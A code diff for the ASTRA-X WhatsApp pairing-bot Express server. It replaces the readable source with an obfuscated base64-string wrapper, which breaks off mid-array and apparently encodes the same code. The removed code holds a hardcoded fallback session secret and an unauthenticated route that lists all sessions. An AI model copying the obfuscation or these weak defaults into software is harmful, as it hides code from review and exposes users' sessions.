@@ -1,626 +1,555 @@
-'use strict';
-require('dotenv').config();
-const express  = require('express');
-const session  = require('express-session');
-const path     = require('path');
-const fs       = require('fs');
-const logger   = require('./utils/logger');
-const { validateEnv } = require('./utils/env');
-validateEnv();   // ← warn about missing / default env vars at startup
-const adminRoutes = require('./routes/admin');
-const {
-  startSession, cancelSession, getSession, deleteSession,
-  getAllSessions, getAvailableCommands, restoreAllSessions,
-} = require('./utils/socket');
-const {
-  isUserRestricted, addRestrictedUser, removeRestrictedUser,
-} = require('./utils/restrictions');
-const { startChannelCheck } = require('./tasks/channelCheck');
-const ss            = require('./utils/sessionStore');
-const userStore     = require('./utils/userStore');
-const subAdminStore = require('./utils/subAdminStore');
-const subRoutes     = require('./routes/sub');
-const rateLimiter = require('./utils/ratelimit');
-
-const app  = express();
-const PORT = parseInt(process.env.PORT) || 3000;
-const HOST = process.env.HOST || '0.0.0.0';
-
-// ── Middleware ────────────────────────────────────────────────────────────
-app.use(express.json({ limit: '5mb' }));
-app.use(express.urlencoded({ extended: true, limit: '5mb' }));
-app.use(express.static(path.join(__dirname, '../public')));
-app.use(session({
-  secret: process.env.SESSION_SECRET || 'astrax_secret_key_2024',  // must match config.js default
-  resave: false,
-  saveUninitialized: false,
-  cookie: { maxAge: 24 * 60 * 60 * 1000, httpOnly: true },
-}));
-
-// ── Request logger ────────────────────────────────────────────────────────
-app.use((req, res, next) => {
-  const t = Date.now();
-  res.on('finish', () => {
-    const ms   = Date.now() - t;
-    const icon = res.statusCode >= 500 ? '🔴' : res.statusCode >= 400 ? '🟡' : '🟢';
-    logger.info(`${icon} ${req.method} ${req.path} ${res.statusCode} (${ms}ms)`);
-  });
-  next();
-});
-
-// ══════════════════════════════════════════════════════════════════════════
-// PAIRING PAGE  →  localhost:3000
-// ══════════════════════════════════════════════════════════════════════════
-app.get('/', (req, res) => {
-  const htmlFile = path.join(__dirname, '../public/index.html');
-  if (fs.existsSync(htmlFile)) return res.sendFile(htmlFile);
-
-  res.send(`<!DOCTYPE html><html lang="en"><head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ASTRA-X Bot — Connect</title>
-<style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{font-family:'Segoe UI',sans-serif;background:#060d14;min-height:100vh;
-  display:flex;flex-direction:column;align-items:center;justify-content:center;
-  color:#e2e8f0;padding:20px}
-.logo{width:220px;height:220px;object-fit:contain;border-radius:20px;
-  margin-bottom:12px;filter:drop-shadow(0 0 30px rgba(37,211,102,.5))}
-.card{background:rgba(11,18,30,.97);border:1px solid rgba(37,211,102,.2);
-  border-radius:20px;padding:28px 24px;width:100%;max-width:440px;text-align:center}
-h1{font-size:1.5rem;font-weight:900;margin-bottom:4px;
-  background:linear-gradient(90deg,#25d366,#3b82f6,#8b5cf6);
-  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-p{color:#64748b;font-size:.88rem;margin-bottom:22px}
-input{width:100%;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);
-  border-radius:10px;color:#e2e8f0;padding:13px 16px;font-size:1rem;margin-bottom:12px;outline:none}
-input:focus{border-color:#25d366}
-button{width:100%;background:linear-gradient(135deg,#25d366,#3b82f6);color:#fff;
-  border:none;border-radius:10px;padding:14px;font-size:1rem;font-weight:700;cursor:pointer}
-button:hover{opacity:.88}button:disabled{opacity:.5;cursor:not-allowed}
-.reset-btn{background:rgba(255,255,255,.06);color:#94a3b8;margin-top:8px;font-size:.9rem}
-.code-box{background:#0f1a2e;border:2px solid #25d366;border-radius:14px;padding:22px;
-  margin-top:18px;letter-spacing:8px;font-size:2.2rem;font-weight:900;color:#25d366;
-  cursor:pointer;user-select:all;font-family:monospace}
-.code-box:hover{background:#0a1220}
-.steps{text-align:left;margin-top:18px;font-size:.82rem;color:#94a3b8;line-height:2}
-.steps b{color:#25d366}.steps span{color:#64748b;font-size:.75rem}
-.status{font-size:.85rem;margin-top:12px;padding:10px 14px;border-radius:8px;display:none}
-.ok{background:rgba(37,211,102,.1);color:#25d366;border:1px solid rgba(37,211,102,.3)}
-.err{background:rgba(239,68,68,.1);color:#ef4444;border:1px solid rgba(239,68,68,.3)}
-.links{display:flex;gap:10px;margin-top:18px;justify-content:center}
-.links a{font-size:.78rem;color:#3b82f6;text-decoration:none;
-  background:rgba(59,130,246,.1);padding:6px 14px;border-radius:8px}
-</style></head><body>
-<img src="/Astralogo.png" alt="ASTRA-X" class="logo" onerror="this.style.display='none'">
-<div class="card">
-  <h1>ASTRA-X Bot</h1>
-  <p>Enter your WhatsApp number to get a pairing code</p>
-  <input id="phone" type="tel" placeholder="256747304196 (country code, no +)">
-  <button id="btn" onclick="pair()">🔗 Get Pairing Code</button>
-  <button class="reset-btn" onclick="reset()">🔄 Reset</button>
-  <div id="status" class="status"></div>
-  <div id="codeBox" class="code-box" style="display:none" onclick="copy()" title="Tap to copy"></div>
-  <div id="steps" class="steps" style="display:none">
-    <b>How to link on your phone:</b><br>
-    1. Open WhatsApp → tap ⋮ Menu<br>
-    2. Tap <b>Linked Devices</b><br>
-    3. Tap <b>Link a Device</b><br>
-    4. Tap <b>Link with phone number instead</b><br>
-    5. Enter the code above<br>
-    <span>Code expires in 5 minutes. Tap to copy.</span>
-  </div>
-  <div class="links">
-    <a href="/admin">🔐 Admin</a>
-    <a href="/health">💊 Health</a>
-  </div>
-</div>
-<script>
-let currentUserId = null;
-async function pair() {
-  const phone = document.getElementById('phone').value.trim().replace(/\\D/g,'');
-  if (!phone || phone.length < 7) return show('❌ Enter a valid phone number','err');
-  document.getElementById('btn').disabled = true;
-  document.getElementById('btn').textContent = '⏳ Generating...';
-  show('⏳ Connecting to WhatsApp...','ok');
-  try {
-    const r = await fetch('/api/pair',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phoneNumber:phone})});
-    const d = await r.json();
-    if (d.success && d.code) {
-      currentUserId = d.userId;
-      show('✅ Code ready! Enter it in WhatsApp within 5 minutes.','ok');
-      document.getElementById('codeBox').textContent = d.code;
-      document.getElementById('codeBox').style.display = 'block';
-      document.getElementById('steps').style.display = 'block';
-      document.getElementById('btn').textContent = '🔗 Get New Code';
-      document.getElementById('btn').disabled = false;
-    } else {
-      show('❌ '+(d.message||'Failed. Try again.'),'err');
-      document.getElementById('btn').textContent = '🔗 Get Pairing Code';
-      document.getElementById('btn').disabled = false;
-    }
-  } catch(e) {
-    show('❌ Network error. Is the bot running?','err');
-    document.getElementById('btn').textContent = '🔗 Get Pairing Code';
-    document.getElementById('btn').disabled = false;
-  }
-}
-async function reset() {
-  if (currentUserId) await fetch('/api/pair/reset',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:currentUserId})}).catch(()=>{});
-  document.getElementById('codeBox').style.display = 'none';
-  document.getElementById('steps').style.display = 'none';
-  document.getElementById('status').style.display = 'none';
-  document.getElementById('btn').textContent = '🔗 Get Pairing Code';
-  document.getElementById('btn').disabled = false;
-  currentUserId = null;
-}
-function show(msg,type){const s=document.getElementById('status');s.textContent=msg;s.className='status '+type;s.style.display='block';}
-function copy(){const c=document.getElementById('codeBox').textContent;navigator.clipboard?.writeText(c).then(()=>show('📋 Code copied!','ok'));}
-document.getElementById('phone').addEventListener('keypress',e=>{if(e.key==='Enter')pair();});
-</script></body></html>`);
-});
-;
-
-// ══════════════════════════════════════════════════════════════════════════
-// HEALTH PAGE  →  localhost:3000/health
-// ══════════════════════════════════════════════════════════════════════════
-app.get('/health', (req, res) => {
-  const htmlFile = path.join(__dirname, '../public/health.html');
-  if (fs.existsSync(htmlFile)) return res.sendFile(htmlFile);
-
-  // Fallback inline health page
-  const sessions = getAllSessions();
-  const active   = sessions.filter(s => s.isActive).length;
-  const mem      = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
-  const up       = Math.floor(process.uptime());
-  const h=Math.floor(up/3600), m=Math.floor((up%3600)/60), s=up%60;
-
-  res.send(`<!DOCTYPE html><html lang="en"><head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<meta http-equiv="refresh" content="15">
-<title>ASTRA-X Health</title>
-<style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{font-family:'Segoe UI',sans-serif;background:#060d14;min-height:100vh;
-  display:flex;flex-direction:column;align-items:center;justify-content:center;color:#e2e8f0;padding:20px}
-h1{font-size:2rem;font-weight:900;margin-bottom:6px;
-  background:linear-gradient(90deg,#25d366,#3b82f6);
-  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;
-  margin-top:24px;width:100%;max-width:600px}
-.card{background:rgba(11,18,30,.97);border:1px solid rgba(37,211,102,.15);
-  border-radius:14px;padding:20px;text-align:center}
-.val{font-size:1.8rem;font-weight:900;
-  background:linear-gradient(90deg,#25d366,#3b82f6);
-  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.lbl{font-size:.72rem;color:#64748b;margin-top:4px;text-transform:uppercase}
-.badge{display:inline-block;padding:6px 20px;border-radius:20px;font-size:.85rem;font-weight:700;
-  background:rgba(37,211,102,.15);color:#25d366;border:1px solid rgba(37,211,102,.3);margin-bottom:8px}
-a{color:#3b82f6;font-size:.85rem;margin-top:20px;display:block}
-</style></head><body>
-<span class="badge">🟢 ALIVE</span>
-<h1>ASTRA-X Bot</h1>
-<p style="color:#64748b;font-size:.85rem">Auto-refreshes every 15s</p>
-<div class="grid">
-  <div class="card"><div class="val">${sessions.length}</div><div class="lbl">Users</div></div>
-  <div class="card"><div class="val">${active}</div><div class="lbl">Active</div></div>
-  <div class="card"><div class="val">${mem}MB</div><div class="lbl">RAM</div></div>
-  <div class="card"><div class="val">${h}h ${m}m ${s}s</div><div class="lbl">Uptime</div></div>
-</div>
-<a href="/">← Pairing Page</a>
-<a href="/admin">🔐 Admin Panel</a>
-</body></html>`);
-});
-
-// ══════════════════════════════════════════════════════════════════════════
-// API ROUTES
-// ══════════════════════════════════════════════════════════════════════════
-
-// Health JSON
-// Ping endpoint — always returns 200 quickly for keepalive
-app.get('/api/ping', (req, res) => res.json({ ok: true, ts: Date.now() }));
-
-app.get('/api/health', (req, res) => {
-  const mem = process.memoryUsage();
-  const up  = Math.floor(process.uptime());
-  const h=Math.floor(up/3600), m=Math.floor((up%3600)/60), s=up%60;
-  const sessions = getAllSessions();
-  res.json({
-    success: true, status: 'alive',
-    uptime: `${h}h ${m}m ${s}s`, uptime_s: up,
-    sessions: sessions.length,
-    active: sessions.filter(s => s.isActive).length,
-    memory_mb: (mem.heapUsed/1024/1024).toFixed(1),
-    node: process.version,
-    platform: process.platform,
-    timestamp: new Date().toISOString(),
-  });
-});
-// Alias
-app.get('/api/health/json', (req, res) => res.redirect('/api/health'));
-
-// Pair  — 5 requests per minute per IP
-app.post('/api/pair', rateLimiter({ max: 5, window: 60, message: '⏳ Too many pairing requests. Please wait 60 seconds.' }), async (req, res) => {
-  try {
-    const { userId, phoneNumber } = req.body;
-    if (!phoneNumber) return res.status(400).json({ success: false, message: '❌ Phone number required' });
-    const clean = String(phoneNumber).replace(/\D/g, '');
-    if (clean.length < 7) return res.status(400).json({ success: false, message: '❌ Invalid phone number' });
-    const uid = userId || `user_${Date.now()}_${clean}`;
-    if (isUserRestricted(uid)) return res.status(403).json({ success: false, message: '🚫 Account restricted' });
-
-    // ── CRITICAL FIX: Register session IMMEDIATELY (inactive) before socket starts.
-    //    This ensures the sessionId exists in the store right now, is returned in
-    //    this response, appears in admin search instantly, and persists across restarts.
-    //    The session stays inactive until an owner/admin explicitly activates it.
-    const sessionId = ss.register(uid, clean);
-    logger.info(`📱 Pair request: ${clean} → ${uid} | Session pre-registered: ${sessionId}`);
-
-    const result = await startSession(uid, clean);
-    if (result?.code) {
-      return res.json({
-        success:     true,
-        code:        result.code,
-        userId:      uid,
-        phoneNumber: clean,
-        sessionId,
-        message:     '✅ Enter this code in WhatsApp → Linked Devices',
-      });
-    }
-    return res.status(400).json({ success: false, message: '❌ Could not generate pairing code. Try again.' });
-  } catch (e) {
-    logger.error('POST /api/pair:', e.message);
-    const msg = e.message.includes('TIMEOUT') ? '⏱️ Timed out — try again' : `🔴 ${e.message}`;
-    res.status(500).json({ success: false, message: msg });
-  }
-});
-
-// Reset pair
-app.post('/api/pair/reset', (req, res) => {
-  try {
-    const { userId } = req.body;
-    if (userId) cancelSession(userId);
-    res.json({ success: true, message: '✅ Reset — pair again' });
-  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-// Sessions
-app.get('/api/sessions', (req, res) => {
-  try { res.json({ success: true, sessions: getAllSessions(), count: getAllSessions().length }); }
-  catch (e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.get('/api/session/:userId', (req, res) => {
-  try {
-    const s = getSession(req.params.userId);
-    if (!s) return res.status(404).json({ success: false, message: 'Session not found' });
-    res.json({ success: true, phoneNumber: s.phoneNumber, isActive: !!(s.sock?.user), createdAt: s.createdAt });
-  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-// Commands list
-app.get('/api/commands', (req, res) => {
-  try {
-    res.json({ success: true, commands: getAvailableCommands(), prefix: process.env.BOT_PREFIX || '!' });
-  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-// ── Admin API (requires auth + CSRF) ─────────────────────────────────────
-const requireAdmin = (req, res, next) =>
-  req.session?.adminAuth ? next() : res.status(401).json({ success: false, message: 'Unauthorized' });
-
-// CSRF check for JSON API calls — reads from X-CSRF-Token header or _csrf body field
-const csrfCheckAPI = (req, res, next) => {
-  const tok = req.headers?.['x-csrf-token'] || req.body?._csrf;
-  if (!tok || tok !== req.session?.csrfToken)
-    return res.status(403).json({ success: false, message: 'CSRF token invalid. Refresh the admin page.' });
-  next();
-};
-
-app.post('/api/admin/ban-user', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { userId, reason } = req.body;
-    if (!userId) return res.status(400).json({ success: false, message: 'userId required' });
-    addRestrictedUser(userId, reason || 'Banned by admin');
-    deleteSession(userId);
-    res.json({ success: true, message: `🔨 ${userId} banned and session deleted` });
-  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/admin/restrict-user', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { userId, reason } = req.body;
-    if (!userId) return res.status(400).json({ success: false, message: 'userId required' });
-    addRestrictedUser(userId, reason || 'Restricted');
-    deleteSession(userId);
-    res.json({ success: true, message: `🚫 ${userId} restricted` });
-  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/admin/unrestrict-user', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { userId } = req.body;
-    if (!userId) return res.status(400).json({ success: false, message: 'userId required' });
-    removeRestrictedUser(userId);
-    res.json({ success: true, message: `✅ ${userId} unrestricted` });
-  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/admin/delete-user', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { userId } = req.body;
-    if (!userId) return res.status(400).json({ success: false, message: 'userId required' });
-    const deleted = deleteSession(userId);
-    res.json({ success: true, message: deleted ? `✅ Deleted ${userId}` : `ℹ️ No active session for ${userId}` });
-  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/admin/add-user', requireAdmin, csrfCheckAPI, async (req, res) => {
-  try {
-    const { phoneNumber } = req.body;
-    if (!phoneNumber) return res.status(400).json({ success: false, message: 'phoneNumber required' });
-    const clean = phoneNumber.replace(/\D/g, '');
-    const uid   = `admin_${Date.now()}_${clean}`;
-    await startSession(uid, clean);
-    res.json({ success: true, message: `✅ Session started for ${clean}`, userId: uid });
-  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/admin/broadcast', requireAdmin, csrfCheckAPI, async (req, res) => {
-  try {
-    const { message } = req.body;
-    if (!message?.trim()) return res.status(400).json({ success: false, message: 'message required' });
-    const all = getAllSessions();
-    let ok = 0, fail = 0;
-    for (const s of all) {
-      const sess = getSession(s.userId);
-      if (!sess?.sock?.user) { fail++; continue; }
-      try {
-        await sess.sock.sendMessage(
-          sess.sock.user.id.split(':')[0] + '@s.whatsapp.net',
-          { text: message }
-        );
-        ok++;
-      } catch (_) { fail++; }
-    }
-    res.json({ success: true, message: `✅ Sent: ${ok}, Failed: ${fail}` });
-  } catch (e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-// ── Admin UI ──────────────────────────────────────────────────────────────
-app.use('/admin', adminRoutes);
-app.use('/sub',   subRoutes);
-
-
-// ──────────────────────────────────────────────────────────────────────────────
-// API ROUTES — all before the 404 handler
-// ──────────────────────────────────────────────────────────────────────────────
-
-// ── Sub-Admin Management API (Owner only) ─────────────────────────────────────
-app.post('/api/sub-admin/create', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { username, email, password } = req.body;
-    const quota = req.body.quota || req.body.sessionLimit || 5;
-    if (!username || !email || !password)
-      return res.status(400).json({ success: false, message: 'All fields required' });
-    const existing = subAdminStore.getAll().find(a => a.username === username.trim() || a.email === email.trim().toLowerCase());
-    if (existing)
-      return res.status(400).json({ success: false, message: 'Username or email already exists' });
-    const admin = subAdminStore.createAdmin(username.trim(), email.trim().toLowerCase(), password, quota);
-    logger.info('Owner created sub-admin: ' + admin.username);
-    res.json({ success: true, message: '✅ Sub-admin ' + admin.username + ' created successfully' });
-  } catch(e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/sub-admin/delete', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { id } = req.body;
-    const admin = subAdminStore.getById(id);
-    if (!admin) return res.status(404).json({ success: false, message: 'Sub-admin not found' });
-    subAdminStore.deleteAdmin(id);
-    res.json({ success: true, message: admin.username + ' deleted' });
-  } catch(e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/sub-admin/quota', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { id, quota } = req.body;
-    subAdminStore.updateQuota(id, quota);
-    res.json({ success: true, message: 'Quota updated to ' + quota });
-  } catch(e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/sub-admin/toggle', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { id } = req.body;
-    const admin = subAdminStore.getById(id);
-    if (!admin) return res.status(404).json({ success: false, message: 'Not found' });
-    const d = require('./utils/subAdminStore');
-    const all = d.getAll ? require('./utils/subAdminStore') : null;
-    // Toggle active state
-    const fs   = require('fs');
-    const path = require('path');
-    const FILE = path.join(__dirname, '../data/sub_admins.json');
-    const data = JSON.parse(fs.readFileSync(FILE,'utf8'));
-    if (data[id]) {
-      data[id].active = !data[id].active;
-      fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
-    }
-    res.json({ success: true, message: (data[id]?.active ? 'Enabled' : 'Disabled') + ' ' + admin.username });
-  } catch(e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-// ── Session Management API (Owner only) ───────────────────────────────────────
-app.get('/api/sessions', requireAdmin, (req, res) => {
-  const live    = getAllSessions();
-  const records = ss.getAll().map(r => ({
-    ...r,
-    online: live.some(s => s.userId === r.userId && s.isActive),
-  }));
-  res.json({ success: true, sessions: records });
-});
-
-app.post('/api/sessions/activate', requireAdmin, csrfCheckAPI, async (req, res) => {
-  try {
-    const { sessionId } = req.body;
-    if (!sessionId) return res.status(400).json({ success: false, message: 'sessionId required' });
-    const sid    = sessionId.trim().toUpperCase();
-    const record = ss.getBySessionId(sid);
-    if (!record) return res.status(404).json({ success: false, message: 'Session ID not found: ' + sid });
-    // Activate in both stores
-    ss.activate(sid);
-    userStore.activateUser(record.userId, record.phoneNumber, 'owner');
-    // Restore WhatsApp connection
-    const { restoreSession } = require('./utils/socket');
-    if (typeof restoreSession === 'function') {
-      await restoreSession(record.userId).catch(e => logger.warn('Restore warn: ' + e.message));
-    }
-    logger.info('Owner activated: ' + sid + ' (+' + record.phoneNumber + ')');
-    res.json({ success: true, message: '✅ Bot is now ONLINE for +' + record.phoneNumber + ' (1 month subscription)' });
-  } catch(e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/sessions/deactivate', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { sessionId } = req.body;
-    const record = ss.getBySessionId(sessionId);
-    if (!record) return res.status(404).json({ success: false, message: 'Not found' });
-    ss.deactivate(sessionId);
-    userStore.deactivateUser(record.userId);
-    deleteSession(record.userId);
-    res.json({ success: true, message: '🔒 Bot OFFLINE for +' + record.phoneNumber });
-  } catch(e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/sessions/delete', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { sessionId } = req.body;
-    const record = ss.getBySessionId(sessionId);
-    if (record) deleteSession(record.userId);
-    ss.remove(sessionId);
-    res.json({ success: true, message: '🗑️ Deleted' });
-  } catch(e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/sessions/note', requireAdmin, csrfCheckAPI, (req, res) => {
-  ss.setNote(req.body.sessionId, req.body.note || '');
-  res.json({ success: true });
-});
-
-// ── Ban Management API ───────────────────────────────────────────────────────────
-app.get('/api/banned', requireAdmin, (req, res) => {
-  res.json({ success: true, banned: userStore.getAllBanned() });
-});
-
-app.post('/api/ban', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { phoneNumber, reason } = req.body;
-    if (!phoneNumber) return res.status(400).json({ success: false, message: 'phoneNumber required' });
-    // Also deactivate if they have an active session
-    const clean = phoneNumber.replace(/\D/g,'');
-    const allSess = ss.getAll();
-    const record  = allSess.find(r => r.phoneNumber === clean);
-    if (record) {
-      ss.deactivate(record.sessionId);
-      userStore.deactivateUser(record.userId);
-      deleteSession(record.userId);
-    }
-    const ban = userStore.banUser(phoneNumber, reason || 'Banned by admin', 'owner');
-    logger.info('Banned: +' + clean + ' — ' + (reason || 'no reason'));
-    res.json({ success: true, message: '🔨 +' + clean + ' banned and disconnected' });
-  } catch(e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-app.post('/api/unban', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { phoneNumber } = req.body;
-    if (!phoneNumber) return res.status(400).json({ success: false, message: 'phoneNumber required' });
-    userStore.unbanUser(phoneNumber);
-    res.json({ success: true, message: '✅ +' + phoneNumber.replace(/\D/g,'') + ' unbanned' });
-  } catch(e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-// ── Deactivate by userId ──────────────────────────────────────────────────────────
-app.post('/api/sessions/deactivate-by-user', requireAdmin, csrfCheckAPI, (req, res) => {
-  try {
-    const { userId } = req.body;
-    if (!userId) return res.status(400).json({ success: false, message: 'userId required' });
-    userStore.deactivateUser(userId);
-    deleteSession(userId);
-    // Find and deactivate session record
-    const record = ss.getAll().find(r => r.userId === userId);
-    if (record) ss.deactivate(record.sessionId);
-    res.json({ success: true, message: 'User deactivated' });
-  } catch(e) { res.status(500).json({ success: false, message: e.message }); }
-});
-
-// ── Activated Users API ───────────────────────────────────────────────────────────
-app.get('/api/activated', requireAdmin, (req, res) => {
-  res.json({ success: true, users: userStore.getAllActivated() });
-});
-
-// ── REMOVED: Public /api/lookup-session endpoint.
-//    Phone number search has been moved to admin and owner panels only.
-//    See: GET /admin/api/lookup-session (requires admin auth)
-
-// ── Health ─────────────────────────────────────────────────────────────────────
-app.get('/api/ping', (req, res) => res.json({ ok: true, ts: Date.now() }));
-
-// ── Static UI routes ───────────────────────────────────────────────────────────
-app.use('/admin', adminRoutes);
-app.use('/sub',   subRoutes);
-
-// ── 404 ────────────────────────────────────────────────────────────────────────
-app.use((req, res) => res.status(404).json({ success: false, message: 'Route not found: ' + req.path }));
-
-// ── Error handler ──────────────────────────────────────────────────────────────
-app.use((err, req, res, next) => {
-  logger.error('Express error:', err.message);
-  res.status(500).json({ success: false, message: 'Internal server error' });
-});
-
-// ══════════════════════════════════════════════════════════════════════════
-// START
-// ══════════════════════════════════════════════════════════════════════════
-const server = app.listen(PORT, HOST, async () => {
-  const url = `http://localhost:${PORT}`;
-  console.log('\x1b[32m');
-  console.log('╔══════════════════════════════════════════════════════╗');
-  console.log('║       🚀  ASTRA-X BOT v6.6.6  STARTED  🚀           ║');
-  console.log('╠══════════════════════════════════════════════════════╣');
-  console.log('║  📱 Pairing:    ' + url.padEnd(37) + '║');
-  console.log('║  🔐 Admin:      ' + (url+'/admin').padEnd(37) + '║');
-  console.log('║  💊 Health:     ' + (url+'/health').padEnd(37) + '║');
-  console.log('║  📊 API Health: ' + (url+'/api/health').padEnd(37) + '║');
-  console.log('╚══════════════════════════════════════════════════════╝');
-  console.log('\x1b[0m');
-
-  try { await restoreAllSessions(); }
-  catch (e) { logger.error('Session restore failed:', e.message); }
-
-  try { startChannelCheck();
-
-// Check session expiry every hour
-setInterval(() => {
-  try { ss.checkExpiry(); } catch(_) {}
-}, 60 * 60 * 1000);
-logger.info('⏰ Session expiry checker started (runs every hour)'); }
-  catch (e) { logger.error('Channel check failed:', e.message); }
-});
-
-server.on('error', (e) => {
-  if (e.code === 'EADDRINUSE')
-    logger.error(`❌ Port ${PORT} already in use. Change PORT in .env or stop the other process.`);
-  else logger.error('Server error:', e.message);
-  process.exit(1);
-});
-
-process.on('SIGTERM', () => server.close(() => process.exit(0)));
-process.on('SIGINT',  () => server.close(() => process.exit(0)));
-process.on('unhandledRejection', reason => logger.error('Unhandled rejection:', reason));
-process.on('uncaughtException',  err    => {
-  logger.error('Uncaught exception:', err.message);
-  if (['EACCES','EADDRINUSE','MODULE_NOT_FOUND'].some(c => err.code === c || err.message.includes(c)))
-    process.exit(1);
-});
-
-module.exports = app;
+(function(){
+var _0x1a2b=["J3VzZSBzdHJpY3QnOwpyZXF1aXJlKCdkb3RlbnYnKS5jb25maWcoKTsKY29uc3QgZXhwcmVzcyAgPSBy",
+    "ZXF1aXJlKCdleHByZXNzJyk7CmNvbnN0IHNlc3Npb24gID0gcmVxdWlyZSgnZXhwcmVzcy1zZXNzaW9u",
+    "Jyk7CmNvbnN0IHBhdGggICAgID0gcmVxdWlyZSgncGF0aCcpOwpjb25zdCBmcyAgICAgICA9IHJlcXVp",
+    "cmUoJ2ZzJyk7CmNvbnN0IGxvZ2dlciAgID0gcmVxdWlyZSgnLi91dGlscy9sb2dnZXInKTsKY29uc3Qg",
+    "eyB2YWxpZGF0ZUVudiB9ID0gcmVxdWlyZSgnLi91dGlscy9lbnYnKTsKdmFsaWRhdGVFbnYoKTsgICAv",
+    "LyDihpAgd2FybiBhYm91dCBtaXNzaW5nIC8gZGVmYXVsdCBlbnYgdmFycyBhdCBzdGFydHVwCmNvbnN0",
+    "IGFkbWluUm91dGVzID0gcmVxdWlyZSgnLi9yb3V0ZXMvYWRtaW4nKTsKY29uc3QgewogIHN0YXJ0U2Vz",
+    "c2lvbiwgY2FuY2VsU2Vzc2lvbiwgZ2V0U2Vzc2lvbiwgZGVsZXRlU2Vzc2lvbiwKICBnZXRBbGxTZXNz",
+    "aW9ucywgZ2V0QXZhaWxhYmxlQ29tbWFuZHMsIHJlc3RvcmVBbGxTZXNzaW9ucywKfSA9IHJlcXVpcmUo",
+    "Jy4vdXRpbHMvc29ja2V0Jyk7CmNvbnN0IHsKICBpc1VzZXJSZXN0cmljdGVkLCBhZGRSZXN0cmljdGVk",
+    "VXNlciwgcmVtb3ZlUmVzdHJpY3RlZFVzZXIsCn0gPSByZXF1aXJlKCcuL3V0aWxzL3Jlc3RyaWN0aW9u",
+    "cycpOwpjb25zdCB7IHN0YXJ0Q2hhbm5lbENoZWNrIH0gPSByZXF1aXJlKCcuL3Rhc2tzL2NoYW5uZWxD",
+    "aGVjaycpOwpjb25zdCBzcyAgICAgICAgICAgID0gcmVxdWlyZSgnLi91dGlscy9zZXNzaW9uU3RvcmUn",
+    "KTsKY29uc3QgdXNlclN0b3JlICAgICA9IHJlcXVpcmUoJy4vdXRpbHMvdXNlclN0b3JlJyk7CmNvbnN0",
+    "IHN1YkFkbWluU3RvcmUgPSByZXF1aXJlKCcuL3V0aWxzL3N1YkFkbWluU3RvcmUnKTsKY29uc3Qgc3Vi",
+    "Um91dGVzICAgICA9IHJlcXVpcmUoJy4vcm91dGVzL3N1YicpOwpjb25zdCByYXRlTGltaXRlciA9IHJl",
+    "cXVpcmUoJy4vdXRpbHMvcmF0ZWxpbWl0Jyk7Cgpjb25zdCBhcHAgID0gZXhwcmVzcygpOwpjb25zdCBQ",
+    "T1JUID0gcGFyc2VJbnQocHJvY2Vzcy5lbnYuUE9SVCkgfHwgMzAwMDsKY29uc3QgSE9TVCA9IHByb2Nl",
+    "c3MuZW52LkhPU1QgfHwgJzAuMC4wLjAnOwoKLy8g4pSA4pSAIE1pZGRsZXdhcmUg4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACmFwcC51c2UoZXhw",
+    "cmVzcy5qc29uKHsgbGltaXQ6ICc1bWInIH0pKTsKYXBwLnVzZShleHByZXNzLnVybGVuY29kZWQoeyBl",
